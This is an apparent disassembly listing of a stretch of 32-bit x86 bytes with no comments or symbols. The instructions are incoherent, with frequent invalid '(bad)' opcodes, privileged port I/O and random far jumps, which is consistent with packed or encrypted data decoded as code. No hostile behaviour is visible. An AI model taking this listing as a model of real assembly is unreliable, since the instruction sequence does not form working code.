  41377c:	mov    esp,0x697f2d27
  413781:	retf   
  413782:	daa    
  413783:	test   eax,0xc616033f
  413788:	loope  0x41372e
  41378a:	les    edi,FWORD PTR [esi+edi*2+0x662d75e4]
  413791:	pop    es
  413792:	loop   0x413766
  413794:	jo     0x41380a
  413796:	mov    eax,ds:0x8d624a14
  41379b:	aad    0x86
  41379d:	and    DWORD PTR [eax+0x4f],esp
  4137a0:	mov    ebx,0x8eb3a97c
  4137a5:	mov    bh,0x92
  4137a7:	(bad)  
  4137a8:	in     eax,0xd2
  4137aa:	(bad)  
  4137ab:	(bad)  
  4137ac:	cmp    al,0xc5
  4137ae:	cmp    BYTE PTR ds:0x7b040359,bl
  4137b4:	jne    0x41373e
  4137b6:	xor    edx,esi
  4137b8:	jecxz  0x4137c7
  4137ba:	dec    ebp
  4137bb:	jno    0x41381d
  4137bd:	rcr    DWORD PTR [edi],1
  4137bf:	retf   
  4137c0:	aas    
  4137c1:	push   ss
  4137c2:	shr    eax,0x8b
  4137c5:	add    edi,esp
  4137c7:	mov    ebp,0x71912298
  4137cc:	and    ah,dl
  4137ce:	out    0x97,eax
  4137d0:	pusha  
  4137d1:	test   DWORD PTR [edi+0x60aaf20b],esi
  4137d7:	dec    ecx
  4137d8:	pop    edx
  4137d9:	nop
  4137da:	imul   ecx,ebx,0x4fa871ff
  4137e0:	xchg   esp,edx
  4137e2:	(bad)  
  4137e4:	outs   dx,BYTE PTR ds:[esi]
  4137e5:	inc    ebx
  4137e6:	mov    al,ds:0x58263e92
  4137eb:	sti    
  4137ec:	xor    al,0xc5
  4137ee:	ins    DWORD PTR es:[edi],dx
  4137ef:	retf   0x27da
  4137f2:	aas    
  4137f3:	dec    ecx
  4137f4:	and    BYTE PTR [ecx+esi*2],bh
  4137f7:	cmc    
  4137f8:	inc    ecx
  4137f9:	add    ch,BYTE PTR [esi]
  4137fb:	mov    eax,ds:0x33dcf70e
  413800:	retf   
  413801:	inc    edi
  413802:	pop    ds
  413803:	jno    0x4137ef
  413805:	in     eax,0x4
  413807:	fmul   st(6),st
  413809:	icebp  
  41380a:	inc    edi
  41380b:	enter  0x104e,0x94
  41380f:	sbb    edi,esp
  413811:	add    al,0x1f
  413813:	xchg   ebx,eax
  413814:	fdivrp st(1),st
  413816:	inc    esp
  413817:	test   BYTE PTR [ebx-0x6f2ecd79],0x66
  41381e:	dec    ebp
  41381f:	(bad)
  413823:	pushf  
  413824:	stos   DWORD PTR es:[edi],eax
  413825:	int    0x60
  413827:	push   esp
  413828:	push   ss
  413829:	jge    0x4137bc
  41382b:	call   0xed5fb22e
  413830:	add    ebx,DWORD PTR [edx+0x4f]
  413833:	mov    dl,0xca
  413835:	aaa    
  413836:	mov    bl,0x9d
  413838:	ds adc edi,eax
  41383b:	push   esp
  41383c:	daa    
  41383d:	jp     0x4138b2
  41383f:	inc    ebp
  413840:	out    dx,al
  413841:	push   es
  413842:	jl     0x41380d
  413844:	cs cmp eax,0x2bbad57a
  41384a:	or     DWORD PTR [ecx-0x3],edi
  41384d:	add    dl,BYTE PTR [esi-0x50520a1]
  413853:	test   DWORD PTR [esi],ebx
  413855:	icebp  
  413856:	pop    eax
  413857:	leave  
  413858:	jns    0x413857
  41385a:	loopne 0x4138b7
  41385c:	mov    esi,0x4e46bc5f
  413861:	add    ebp,eax
  413863:	push   0xffffff8d
  413865:	push   ss
  413866:	pop    ecx
  413867:	lods   eax,DWORD PTR ds:[esi]
  413868:	loope  0x41384e
  41386a:	outs   dx,BYTE PTR ds:[esi]
  41386b:	pop    edi
  41386c:	retf   
  41386d:	cmc    
  41386e:	xlat   BYTE PTR ds:[ebx]
  41386f:	cmp    DWORD PTR [eax],ecx
  413871:	sub    eax,esp
  413873:	jo     0x4138bc
  413875:	add    cl,dl
  413877:	aas    
  413878:	fsubr  st,st(7)
  41387a:	leave  
  41387b:	mov    cl,0xa0
  41387d:	xchg   DWORD PTR [edi-0x60],ecx
  413880:	mov    cl,0x63
  413882:	nop
  413883:	inc    edx
  413884:	mov    cl,0x6
  413886:	lahf   
  413887:	daa    
  413888:	mov    al,0xc4
  41388a:	(bad)  
  41388b:	jecxz  0x4138ae
  41388d:	es in  al,dx
  41388f:	sbb    BYTE PTR [esi-0x246cdf18],dh
  413895:	mov    ecx,0xb1874604
  41389a:	scas   eax,DWORD PTR es:[edi]
  41389b:	push   cs
  41389c:	dec    edx
  41389d:	nop
  41389e:	add    BYTE PTR [edi+0x74],bl
  4138a1:	mov    ebx,0x5502d44e
  4138a6:	jbe    0x4138ba
  4138a8:	gs adc al,0xfc
  4138ab:	xchg   BYTE PTR [edi-0x1c7a31cf],bl
  4138b1:	add    eax,0x203758f3
  4138b6:	shl    DWORD PTR [edx+eax*4+0x2ad150c],1
  4138bd:	pop    ebp
  4138be:	fisttp DWORD PTR [esi+ebx*8]
  4138c1:	xchg   ecx,eax
  4138c2:	jo     0x413880
  4138c4:	add    cl,BYTE PTR [eax+0x58]
  4138c7:	ja     0x41384c
  4138c9:	out    0x60,al
  4138cb:	iret   
  4138cc:	pop    esi
  4138cd:	or     edi,DWORD PTR [edx+0x5a0334d3]
  4138d3:	in     eax,dx
  4138d4:	jnp    0x4138d9
  4138d6:	dec    edi
  4138d7:	pop    eax
  4138d8:	sub    eax,0x6d291fc5
  4138dd:	jno    0x41387a
  4138df:	fadd   DWORD PTR [edi+edi*4+0x41]
  4138e3:	aam    0x36
  4138e5:	cmp    DWORD PTR [eax+0x1e7b0f97],esi
  4138eb:	push   edx
  4138ec:	mov    BYTE PTR ds:0xcf819809,ah
  4138f2:	add    edx,edx
  4138f4:	or     cl,BYTE PTR [esi]
  4138f6:	(bad)  
  4138f8:	mov    ah,0x66
  4138fa:	inc    eax
  4138fb:	mov    esp,0x15fb87c0
  413900:	je     0x4138be
  413902:	and    dh,BYTE PTR ds:0x899a28f9
  413908:	mov    BYTE PTR [ebp-0xf],dh
  41390b:	jmp    0x4138b5
  41390d:	call   FWORD PTR [esi-0x40]
  413910:	cmp    eax,0x9c5c0803
  413915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413916:	scas   eax,DWORD PTR es:[edi]
  413917:	pop    edi
  413918:	mov    ebp,0x89fa01c6
  41391d:	cmc    
  41391e:	or     cl,BYTE PTR [ebp+0x59]
  413921:	ds inc ebp
  413923:	(bad)  
  413924:	arpl   WORD PTR [eax],bx
  413926:	test   al,bl
  413928:	jp     0x41395e
  41392a:	out    dx,eax
  41392b:	push   ebp
  41392c:	inc    edi
  41392d:	sbb    eax,0x8d88f37e
  413932:	dec    eax
  413933:	adc    dh,BYTE PTR ds:0x4a0a3c21
  413939:	add    dh,BYTE PTR [esi+0x58]
  41393c:	retf   
  41393d:	dec    esp
  41393e:	push   0xffffff84
  413940:	sub    al,0x1e
  413942:	pop    ds
  413943:	iret   
  413944:	ins    BYTE PTR es:[edi],dx
  413945:	(bad)  
  413946:	mov    bh,0x32
  413948:	les    ebx,FWORD PTR [edi-0x6d]
  41394b:	aam    0xb7
  41394d:	xlat   BYTE PTR ds:[ebx]
  41394e:	test   eax,0x4ced3620
  413953:	enter  0x1f59,0x7b
  413957:	sub    DWORD PTR [ecx+0x6a],0x25
  41395b:	xlat   BYTE PTR ds:[ebx]
  41395c:	cmp    al,0x41
  41395e:	sub    DWORD PTR [esi],eax
  413960:	inc    BYTE PTR [eax]
  413962:	inc    edx
  413963:	cmp    al,0x99
  413965:	out    0x74,eax
  413967:	mov    ds:0x58d80592,al
  41396c:	mov    cl,0x1b
  41396e:	mov    esi,0x10afca3c
  413973:	push   esp
  413974:	add    DWORD PTR ds:0x50b86d91,esp
  41397a:	mov    eax,ds:0x59e36774
  41397f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413980:	mov    BYTE PTR [ecx+0x3686db3c],dh
  413986:	jb     0x4139ff
  413988:	add    al,0x3
  41398a:	jmp    0x7ca2:0xaba72fe9
  413991:	jg     0x4139b2
  413993:	(bad)  
  413994:	mov    cl,0x7f
  413996:	push   cs
  413997:	hlt    
  413998:	push   0x63d49cff
  41399d:	and    edi,ebp
  41399f:	dec    esp
  4139a0:	mov    ah,0x42
  4139a2:	mov    bh,0x5
  4139a4:	mov    edi,ebp
  4139a6:	stos   DWORD PTR es:[edi],eax
  4139a7:	mov    edx,ebp
  4139a9:	pop    ds
  4139aa:	mov    cl,0x74
  4139ac:	cmp    BYTE PTR [edx],al
  4139ae:	inc    esp
  4139af:	jl     0x41397d
  4139b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139b2:	stos   BYTE PTR es:[edi],al
  4139b3:	or     BYTE PTR [edx+0x49ad6db3],0xbd
  4139ba:	in     al,0xfa
  4139bc:	data16 xor bh,dh
  4139bf:	ins    DWORD PTR es:[edi],dx
  4139c0:	pushf  
  4139c1:	or     DWORD PTR [edi-0x2b],esi
  4139c4:	rcr    edx,cl
  4139c6:	mov    ch,al
  4139c8:	dec    esi
  4139c9:	cld    
  4139ca:	out    dx,eax
  4139cb:	mov    al,0x8f
  4139cd:	popf   
  4139ce:	fcmovbe st,st(3)
  4139d0:	xchg   esi,eax
  4139d1:	sbb    eax,0xdbe44441
  4139d6:	sub    eax,0xc2e21abd
  4139db:	inc    BYTE PTR [edi+0xbb485be]
  4139e1:	aaa    
  4139e2:	cmc    
  4139e3:	pop    eax
  4139e4:	mov    ebp,edi
  4139e6:	les    esi,FWORD PTR [esi-0x5ee270bb]
  4139ec:	xchg   DWORD PTR [edx],eax
  4139ee:	test   al,0xe2
  4139f0:	aaa    
  4139f1:	hlt    
  4139f2:	mov    bl,0x68
  4139f4:	arpl   WORD PTR [edi],dx
  4139f6:	adc    DWORD PTR gs:[edx],ecx
  4139f9:	pop    ds
  4139fa:	dec    ebx
  4139fb:	ja     0x41398d
  4139fd:	bnd jle 0x413a5c
  413a00:	mov    ah,0x2
  413a02:	xchg   DWORD PTR cs:[ecx],ebp
  413a05:	push   es
  413a06:	fwait
  413a07:	aad    0xd6
  413a09:	neg    eax
  413a0b:	pop    edi
  413a0c:	lds    eax,FWORD PTR ds:0x313d5010
  413a12:	add    eax,0xf205a86d
  413a17:	xor    DWORD PTR [ecx],ecx
  413a19:	and    edx,DWORD PTR [ecx+0x45]
  413a1c:	mov    ecx,0x2c3f650e
  413a21:	or     BYTE PTR [ecx-0x18],0xdf
  413a25:	gs mov ebx,0x2e1b8340
  413a2b:	loopne 0x413a15
  413a2d:	cmp    ch,ah
  413a2f:	push   esp
  413a30:	mov    esi,0x888702e4
  413a35:	jg     0x4139d9
  413a37:	inc    edi
  413a38:	add    eax,0xab57999f
  413a3d:	add    eax,0x4730cb6a
  413a42:	xchg   ebp,eax
  413a43:	or     DWORD PTR [ebx],edi
  413a45:	mov    ss,WORD PTR [esp+ecx*1]
  413a48:	mov    dh,0x25
  413a4a:	sahf   
  413a4b:	sbb    ecx,DWORD PTR [ecx]
  413a4d:	pop    esp
  413a4e:	test   DWORD PTR [esi-0x29818250],0x13a73a06
  413a58:	icebp  
  413a59:	imul   eax
  413a5b:	adc    eax,0x9b6aa108
  413a60:	retf   0xd95c
  413a63:	(bad)  
  413a64:	mov    DWORD PTR ds:0xcf840d15,eax
  413a6a:	jne    0x413a41
  413a6c:	fisttp QWORD PTR [esi]
  413a6e:	dec    edx
  413a6f:	add    al,0x34
  413a71:	jne    0x413a4b
  413a73:	lea    ecx,[eax+0x2b737671]
  413a79:	xchg   ebp,eax
  413a7a:	pop    ebx
  413a7b:	push   edi
  413a7c:	test   eax,0x45a97a02
  413a81:	add    al,0x50
  413a83:	cli    
  413a84:	pop    ds
  413a85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a86:	pop    ds
  413a87:	jecxz  0x413aee
  413a89:	mov    eax,DWORD PTR [ecx+0x4af2be8a]
  413a8f:	aam    0x5b
  413a91:	test   eax,0xc3aeac25
  413a96:	call   0x679:0x66d1891e
  413a9d:	sbb    eax,0x29d4b73
  413aa2:	sub    ch,BYTE PTR [ecx-0x50]
  413aa5:	jp     0x413a75
  413aa7:	jmp    0xfd65:0x2f1e1600
  413aae:	pop    ecx
  413aaf:	in     al,dx
  413ab0:	jbe    0x413a99
  413ab2:	aas    
  413ab3:	lods   eax,DWORD PTR ds:[esi]
  413ab4:	sub    eax,0x24b41a9b
  413ab9:	cmp    edi,DWORD PTR [esi+0x1e26854a]
  413abf:	cmp    DWORD PTR [ebx+0x2b],ecx
  413ac2:	dec    eax
  413ac3:	cld    
  413ac4:	sbb    al,0x91
  413ac6:	icebp  
  413ac7:	aam    0xf0
  413ac9:	or     bl,dh
  413acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413acc:	stos   BYTE PTR es:[edi],al
  413acd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ace:	rol    BYTE PTR [eax+ecx*4+0x5b],cl
  413ad2:	loope  0x413a81
  413ad4:	rol    DWORD PTR cs:[ecx],0x57
  413ad8:	xchg   esi,eax
  413ad9:	add    eax,0xb5c96d06
  413ade:	ss icebp 
  413ae0:	or     eax,0xd5291fe7
  413ae5:	adc    DWORD PTR [eax+0xd3136d4],ebp
  413aeb:	lahf   
  413aec:	adc    eax,0x55548264
  413af1:	fwait
  413af2:	sbb    eax,0xbca9f31a
  413af7:	adc    edi,DWORD PTR [edx]
  413af9:	pop    ecx
  413afa:	xchg   esp,eax
  413afb:	aad    0x8a
  413afd:	push   ss
  413afe:	mov    ecx,0x9c825a7b
  413b03:	aad    0x0
  413b05:	push   ebx
  413b06:	jae    0x413ab3
  413b08:	jns    0x413ade
  413b0a:	inc    ebp
  413b0b:	fisttp DWORD PTR [ecx+0x1b8d0ea5]
  413b11:	and    eax,DWORD PTR [ebx]
  413b13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b14:	dec    eax
  413b15:	add    ch,ah
  413b17:	ja     0x413acd
  413b19:	xor    eax,0x4f0e4976
  413b1e:	xchg   esp,eax
  413b1f:	xor    DWORD PTR [esp+edx*1],eax
  413b22:	sub    esi,DWORD PTR ds:0x9cffb838
  413b28:	mov    dh,0x98
  413b2a:	rcl    esp,1
  413b2c:	pusha  
  413b2d:	xor    eax,0x24845d77
  413b32:	jnp    0x413b74
  413b34:	xchg   ebp,eax
  413b35:	jge    0x413b65
  413b37:	retf   
  413b38:	or     DWORD PTR [ebx-0x1ab36c4],eax
  413b3e:	ret    
  413b3f:	aad    0x3a
  413b41:	mov    al,ds:0x84c72c1c
  413b46:	mov    eax,ds:0xb42a1f88
  413b4c:	mov    eax,0xe444a4bd
  413b51:	sbb    BYTE PTR [esi-0x7efc5532],bl
  413b57:	push   ebp
  413b58:	mov    bl,0x83
  413b5a:	fnstenv [ecx-0x72]
  413b5d:	icebp  
  413b5e:	lock mov ecx,0x84a7d4f1
  413b64:	dec    esp
  413b65:	(bad)  
  413b66:	scas   eax,DWORD PTR es:[edi]
  413b67:	aad    0xb7
  413b69:	add    cl,BYTE PTR [ebp-0x5535e56b]
  413b6f:	std    
  413b70:	mov    ebx,ecx
  413b72:	lods   al,BYTE PTR ds:[esi]
  413b73:	sub    eax,0x31294d05
  413b78:	or     BYTE PTR [ebx],al
  413b7a:	xor    al,0x8
  413b7c:	cmp    bl,ah
  413b7e:	inc    esp
  413b7f:	or     al,0xd8
  413b81:	(bad)  
  413b82:	add    eax,0xc4a58926
  413b87:	push   ebx
  413b88:	mov    ss,WORD PTR [ebp+0x232b90f]
  413b8e:	pop    edx
  413b8f:	xchg   DWORD PTR [ebx],ecx
  413b91:	test   DWORD PTR [ecx],0x43ba946e
  413b97:	sub    edx,esi
  413b99:	pushf  
  413b9a:	pop    ds
  413b9b:	push   ebx
  413b9c:	and    DWORD PTR [ecx],ebx
  413b9e:	(bad)  
  413b9f:	ror    dh,cl
  413ba1:	add    cl,dl
  413ba3:	je     0x413bea
  413ba5:	outs   dx,BYTE PTR ds:[esi]
  413ba6:	push   edx
  413ba7:	adc    ah,BYTE PTR [ecx-0x17]
  413baa:	data16 das 
  413bac:	cmc    
  413bad:	into   
  413bae:	jae    0x413c2d
  413bb0:	push   edi
  413bb1:	loop   0x413bf5
  413bb3:	in     al,0x5
  413bb5:	or     al,0x79
  413bb7:	inc    eax
  413bb8:	add    ecx,DWORD PTR [ebp+0x733b9e60]
  413bbe:	mov    ds:0x1fbf7afd,al
  413bc3:	and    eax,DWORD PTR [ecx]
  413bc5:	sbb    al,0xa4
  413bc7:	jp     0x413bfe
  413bc9:	cwde   
  413bca:	xchg   ebx,eax
  413bcb:	hlt    
  413bcc:	repz add eax,0x3ce02456
  413bd2:	xor    BYTE PTR [esp],0xb8
  413bd6:	pop    ds
  413bd7:	repz dec edx
  413bd9:	fistp  WORD PTR [eax]
  413bdb:	or     al,0x16
  413bdd:	(bad)  
  413bde:	jg     0x413bb2
  413be0:	cmp    DWORD PTR ds:0xf2d66028,0x1f
  413be7:	cdq    
  413be8:	retf   
  413be9:	and    DWORD PTR [ecx-0xbac5977],edx
  413bef:	mov    edx,0x2d65df81
  413bf4:	repnz retf 0xd573
  413bf8:	bound  edi,QWORD PTR [ecx+eax*2]
  413bfb:	out    dx,eax
  413bfc:	stc    
  413bfd:	xchg   ebx,eax
  413bfe:	popa   
  413bff:	sub    DWORD PTR [ebp-0x4e],esp
  413c02:	mov    esp,0x65b5e3e
  413c07:	xor    eax,0x463a3d66
  413c0c:	cwde   
  413c0d:	add    eax,0x8b4ca1ac
  413c12:	xchg   esp,eax
  413c13:	sbb    DWORD PTR [edx-0x57],ebp
  413c16:	cmp    al,0x97
  413c18:	cmp    ebp,DWORD PTR [esi+0x3fbe1160]
  413c1e:	pop    ecx
  413c1f:	xchg   ebx,eax
  413c20:	fmul   QWORD PTR [ecx]
  413c22:	adc    esp,0xcb0d041
  413c28:	sbb    BYTE PTR [esp+esi*1-0x3a4e5b7b],dh
  413c2f:	xchg   DWORD PTR [edi-0x136ba6cb],edx
  413c35:	pop    edx
  413c36:	xchg   edx,eax
  413c37:	dec    ebx
  413c38:	(bad)  
  413c39:	adc    al,0xce
  413c3b:	jne    0x413c79
  413c3d:	xchg   ebp,eax
  413c3e:	push   cs
  413c3f:	je     0x413c77
  413c41:	mov    ebp,0xbb862e70
  413c46:	imul   eax,DWORD PTR [edi-0x21],0x51
  413c4a:	test   eax,0xf5e1092e
  413c4f:	jge    0x413c64
  413c51:	add    eax,esi
  413c53:	add    eax,0x86d6eaf0
  413c58:	test   eax,0xd8e1581c
  413c5d:	(bad)
  413c61:	xchg   esi,eax
  413c62:	loopne 0x413c18
  413c64:	ret    0x3f7c
  413c67:	shl    al,cl
  413c69:	inc    ecx
  413c6a:	pop    ebx
  413c6b:	lea    eax,[ebp-0x63a9d44]
  413c71:	test   al,0x7e
  413c73:	cmp    BYTE PTR [edi+0x11b2ee5b],dh
  413c79:	add    ch,al
  413c7b:	ins    DWORD PTR es:[edi],dx
  413c7c:	xor    bh,BYTE PTR [ebx-0x703885d0]
  413c82:	jg     0x413cf6
  413c84:	mov    BYTE PTR [ebp-0x4d],al
  413c87:	ds call 0xbb84:0x37979e76
  413c8f:	inc    ebp
  413c90:	xchg   DWORD PTR [ebx+0x45a23f2f],esi
  413c96:	fwait
  413c97:	inc    edi
  413c98:	pop    edi
  413c99:	fistp  WORD PTR [edi]
  413c9b:	fistp  QWORD PTR [ebx-0x42]
  413c9e:	cs popf 
  413ca0:	jl     0x413ce2
  413ca2:	aas    
  413ca3:	xlat   BYTE PTR ds:[ebx]
  413ca4:	cld    
  413ca5:	seta   BYTE PTR [ecx]
  413ca8:	push   0x19
  413caa:	xor    edx,ebp
  413cac:	mov    DWORD PTR [ecx],eax
  413cae:	test   bl,0x88
  413cb1:	fdivp  st(4),st
  413cb3:	pop    esp
  413cb4:	sub    cl,BYTE PTR [ebp+edx*2+0x7849883d]
  413cbb:	mov    ecx,DWORD PTR [ecx-0x13]
  413cbe:	int    0x35
  413cc0:	mov    BYTE PTR [ebp-0x35c2b13d],al
  413cc6:	in     eax,0xf1
  413cc8:	and    BYTE PTR [edx],al
  413cca:	out    dx,al
  413ccb:	jmp    0x5c2a:0x39d6b768
  413cd2:	push   ds
  413cd3:	dec    ecx
  413cd4:	int    0x47
  413cd6:	ins    DWORD PTR es:[edi],dx
  413cd7:	adc    dh,BYTE PTR [edx-0x2b2a1ff6]
  413cdd:	call   0x6a27:0xd908fa1
  413ce4:	xchg   DWORD PTR [ebx+0x9],esi
  413ce7:	xchg   ebx,eax
  413ce8:	out    0xac,al
  413cea:	mov    al,ds:0x12a7a898
  413cef:	xlat   BYTE PTR ds:[ebx]
  413cf0:	sbb    BYTE PTR [esp+edi*4+0x5b],cl
  413cf4:	push   0xffffffd2
  413cf6:	push   cs
  413cf7:	pop    ebp
  413cf8:	jge    0x413cdd
  413cfa:	pop    esp
  413cfb:	call   FWORD PTR [edi]
  413cfd:	sbb    DWORD PTR [edi-0x6341814d],0xcc05e7a0
  413d07:	add    ecx,DWORD PTR [edi-0x6392b9af]
  413d0d:	push   esp
  413d0e:	sbb    al,0x24
  413d10:	clc    
  413d11:	xchg   esp,eax
  413d12:	pusha  
  413d13:	aas    
  413d14:	jnp    0x413cd7
  413d16:	test   edx,0xd40940e8
  413d1c:	xchg   ecx,eax
  413d1d:	mov    al,ds:0xdabd68aa
  413d22:	cmp    eax,0x6e0ae8e8
  413d27:	add    esi,DWORD PTR [eax]
  413d29:	fsub   QWORD PTR [edi+eiz*2-0x38]
  413d2d:	mov    dh,0xb5
  413d2f:	push   es
  413d30:	xchg   ebp,eax
  413d31:	add    dh,dl
  413d33:	sbb    edi,DWORD PTR [ebx+0x43]
  413d36:	ret    0x6dc8
  413d39:	stos   BYTE PTR es:[edi],al
  413d3a:	pusha  
  413d3b:	std    
  413d3c:	adc    al,0x4c
  413d3e:	dec    eax
  413d3f:	ror    DWORD PTR [ecx+edx*2],0x1f
  413d43:	aam    0x7b
  413d45:	outs   dx,BYTE PTR ds:[esi]
  413d46:	pop    ebp
  413d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d48:	jmp    0x413d4b
  413d4a:	stos   BYTE PTR es:[edi],al
  413d4b:	mov    DWORD PTR ss:[ebp+0x2318e399],eax
  413d52:	lods   al,BYTE PTR ds:[esi]
  413d53:	xchg   edx,eax
  413d54:	add    BYTE PTR [edx],al
  413d56:	scas   al,BYTE PTR es:[edi]
  413d57:	push   edi
  413d58:	xor    al,dh
  413d5a:	or     DWORD PTR [edx+esi*8-0x6dcae084],edx
  413d61:	outs   dx,BYTE PTR ds:[esi]
  413d62:	jne    0x413d56
  413d64:	mov    eax,0xdfabe3ae
  413d69:	ins    DWORD PTR es:[edi],dx
  413d6a:	jmp    0xdbc5:0xfcc31952
  413d71:	jnp    0x413d77
  413d73:	outs   dx,BYTE PTR ds:[esi]
  413d74:	nop
  413d75:	ret    
  413d76:	push   esi
  413d77:	dec    edi
  413d78:	shr    BYTE PTR [edx],0xec
  413d7b:	mov    ebp,fs
  413d7d:	cmp    BYTE PTR [ebp+0x31af8990],bl
  413d83:	inc    ebp
  413d84:	(bad)  
  413d86:	clc    
  413d87:	je     0x413d11
  413d89:	cmp    esp,DWORD PTR [esi]
  413d8b:	jae    0x413d4b
  413d8d:	in     eax,dx
  413d8e:	fcmovnu st,st(6)
  413d90:	aaa    
  413d91:	dec    ecx
  413d92:	sahf   
  413d93:	fcom   DWORD PTR [ebx+0x0]
  413d96:	jnp    0x413d5c
  413d98:	mov    ch,0x14
  413d9a:	pusha  
  413d9b:	push   ss
  413d9c:	cmp    eax,DWORD PTR [edx]
  413d9e:	jae    0x413d7c
  413da0:	sbb    al,0xfe
  413da2:	push   edx
  413da3:	(bad)  
  413da5:	add    eax,0x1bbaebd8
  413daa:	(bad)  
  413dac:	adc    BYTE PTR [ebx],dh
  413dae:	push   ds
  413daf:	daa    
  413db0:	retf   
  413db1:	fbld   TBYTE PTR [edi-0x45]
  413db4:	cmp    al,0x6
  413db6:	inc    ebx
  413db7:	aad    0x53
  413db9:	mov    WORD PTR [edi-0x37],gs
  413dbc:	add    eax,0x59540577
  413dc1:	cmp    DWORD PTR [esi],ebx
  413dc3:	lahf   
  413dc4:	push   ds
  413dc5:	neg    DWORD PTR [esi+0x6a875651]
  413dcb:	aad    0xfc
  413dcd:	mov    ecx,?
  413dcf:	call   FWORD PTR ds:0xfffd848a
  413dd5:	or     DWORD PTR [esi],edx
  413dd7:	aam    0x72
  413dd9:	xchg   edx,eax
  413dda:	mov    dl,0xf1
  413ddc:	jb     0x413e5d
  413dde:	push   edi
  413ddf:	(bad)  
  413de0:	call   0xa3dc:0xdf365242
  413de7:	adc    eax,0x161a1b0
  413dec:	nop
  413ded:	repz or dl,BYTE PTR [ebx+ebx*2-0x68]
  413df2:	shl    BYTE PTR [esi-0x125bfdb4],1
  413df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413df9:	scas   al,BYTE PTR es:[edi]
  413dfa:	xchg   edx,eax
  413dfb:	add    al,0xe7
  413dfd:	sahf   
  413dfe:	pop    ds
  413dff:	mov    ebx,0xad9fb168
  413e04:	sahf   
  413e05:	or     BYTE PTR [edi+0x49fc36d7],0x7b
  413e0c:	(bad)  
  413e0d:	cs jmp 0x413e4c
  413e10:	jno    0x413e3e
  413e12:	push   ds
  413e13:	ins    DWORD PTR es:[edi],dx
  413e14:	cs call 0xd704:0x774e9548
  413e1c:	mov    al,0xfb
  413e1e:	imul   esi,DWORD PTR [ecx],0xffffff86
  413e21:	push   ebx
  413e22:	aad    0x9
  413e24:	mov    BYTE PTR [ebp+0x49],bh
  413e27:	cmp    bh,BYTE PTR [edi+ebp*4+0x218b8a0]
  413e2e:	nop
  413e2f:	lock test al,0x91
  413e32:	inc    esi
  413e33:	arpl   WORD PTR [ecx+0x4683608a],bp
  413e39:	call   0xd225:0xecf67d
  413e40:	xchg   ecx,eax
  413e41:	push   ebx
  413e42:	popf   
  413e43:	loopne 0x413eae
  413e45:	stos   BYTE PTR es:[edi],al
  413e46:	scas   eax,DWORD PTR es:[edi]
  413e47:	mov    ds:0xc560f93b,al
  413e4c:	mov    ds:0xacb99b14,al
  413e51:	lea    edi,[edx-0x2a]
  413e54:	add    eax,0x10bd8a7f
  413e59:	ins    BYTE PTR es:[edi],dx
  413e5a:	dec    esp
  413e5b:	push   esp
  413e5c:	addr16 repz pusha 
  413e5f:	xlat   BYTE PTR ds:[ebx]
  413e60:	or     edx,DWORD PTR [ecx-0x70]
  413e63:	adc    BYTE PTR [eax],dl
  413e65:	pop    ebp
  413e66:	gs aam 0xd1
  413e69:	mov    cl,0xf2
  413e6b:	pop    edi
  413e6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e6d:	adc    edx,0xcc3b8a8a
  413e73:	out    0xbd,al
  413e75:	iret   
  413e76:	inc    edx
  413e77:	scas   eax,DWORD PTR es:[edi]
  413e78:	enter  0xbe6b,0xd5
  413e7c:	xchg   edi,eax
  413e7d:	adc    esi,esi
  413e7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e80:	cmp    eax,0x97ac8b71
  413e85:	sbb    ecx,DWORD PTR [esi+0x58826e61]
  413e8b:	push   edx
  413e8c:	jo     0x413e85
  413e8e:	and    eax,edi
  413e90:	lds    eax,FWORD PTR ds:0x70a42c1a
  413e96:	ret    0x2f45
  413e99:	loope  0x413eba
  413e9b:	cmc    
  413e9c:	cdq    
  413e9d:	push   esp
  413e9e:	imul   ecx,DWORD PTR [ecx],0xd5f19bd2
  413ea4:	in     eax,0x5a
  413ea6:	and    DWORD PTR [eax-0x10d9d34b],esi
  413eac:	push   0xb127b899
  413eb1:	sar    DWORD PTR [ebx+0xb],1
  413eb4:	xchg   ebx,ecx
  413eb6:	call   0xc074:0x6c0ad9d5
  413ebd:	inc    edx
  413ebe:	mov    esi,0x50935dd4
  413ec3:	ficom  WORD PTR [ebx-0x56]
  413ec6:	stc    
  413ec7:	out    0x7d,eax
  413ec9:	hlt    
  413eca:	pusha  
  413ecb:	xchg   DWORD PTR [edx-0x38c99013],eax
  413ed1:	rcl    dl,1
  413ed3:	enter  0x10e,0x4e
  413ed7:	sbb    bl,BYTE PTR [ebp-0x76]
  413eda:	(bad)  
  413edb:	jb     0x413e7a
  413edd:	fld    QWORD PTR [edx+0x65]
  413ee0:	sahf   
  413ee1:	or     ecx,ebp
  413ee3:	int3   
  413ee4:	push   0xbc654501
  413ee9:	push   ss
  413eea:	mov    edi,0x7af9b0af
  413eef:	mov    edx,0xf4cae69d
  413ef4:	mov    BYTE PTR [ecx-0x20],ah
  413ef7:	pusha  
  413ef8:	jns    0x413f41
  413efa:	mov    edx,0x738cb5ef
  413eff:	dec    ebx
  413f00:	jne    0x413e97
  413f02:	pusha  
  413f03:	jmp    0x413f73
  413f05:	jge    0x413eff
  413f07:	jle    0x413efd
  413f09:	add    eax,0x65392a3e
  413f0e:	stc    
  413f0f:	jne    0x413ef3
  413f11:	jae    0x413f0a
  413f13:	pop    es
  413f14:	xchg   ebx,eax
  413f15:	add    al,BYTE PTR [eax+0x61]
  413f18:	out    dx,eax
  413f19:	int    0xb1
  413f1b:	pushf  
  413f1c:	mov    edx,?
  413f1e:	mov    ah,dl
  413f20:	push   ebx
  413f21:	mov    ch,0xc1
  413f23:	inc    edx
  413f24:	aad    0x80
  413f26:	bnd ret 
  413f28:	mov    ecx,ebx
  413f2a:	aad    0xbb
  413f2c:	fcmovnb st,st(0)
  413f2e:	inc    esi
  413f2f:	in     eax,dx
  413f30:	and    eax,0xcd2c4c03
  413f35:	lods   al,BYTE PTR ds:[esi]
  413f36:	mov    ebx,0x4b80e201
